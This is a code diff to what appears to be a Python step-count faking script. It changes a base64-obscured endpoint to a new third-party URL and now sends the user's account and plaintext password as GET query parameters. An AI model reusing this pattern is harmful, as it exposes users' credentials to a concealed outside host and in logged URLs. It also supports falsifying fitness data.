@@ -49,17 +49,28 @@ else:
         consecutive_failures = 0
         for _ in range(attempts):
             try:
-                encoded_url = 'aHR0cDovL2JzLnN2di5pbmsvaW5kZXgucGhw'
+                #encoded_url = 'aHR0cDovL2JzLnN2di5pbmsvaW5kZXgucGhw'
+                encoded_url = 'aHR0cHM6Ly9hcGkub2RkZmFyLmNvbS9nL3J1bi9tb3Rpb24ucGhw'
                 url = base64.b64decode(encoded_url).decode('utf-8')
                 steps = random.randint(min_steps, max_steps)
+
+                # 1. 接口1
+                # data = {
+                #     'account': account,
+                #     'password': password,
+                #     'steps': steps
+                # }
+
+                # 1. 接口2
                 data = {
-                    'account': account,
+                    'user': account,
                     'password': password,
-                    'steps': steps
+                    'step': steps
                 }
 
                 try:
-                    response = requests.post(url, data=data, timeout=timeout)
+                    #response = requests.post(url, data=data, timeout=timeout)
+                    response = requests.get(url, params=data, timeout=timeout)
                     result = response.json()
 
                     if result.get('message') == 'success':
